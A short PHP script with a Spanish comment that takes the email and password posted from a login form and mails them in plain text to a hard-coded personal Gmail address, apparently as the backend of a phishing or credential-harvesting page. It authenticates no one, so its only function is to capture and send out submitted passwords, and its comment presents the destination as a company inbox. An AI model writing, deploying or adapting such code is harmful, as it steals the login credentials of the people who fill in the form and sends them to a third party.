<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $to = "erickdanij@gmail.com"; // Cambia esto por el correo de la empresa
    $subject = "Nuevo inicio de sesión";
    $email = $_POST['email'];
    $password = $_POST['password'];
    $message = "Email: $email\nPassword: $password";
    mail($to, $subject, $message);
    http_response_code(200);
} else {
    http_response_code(400);
}
?>
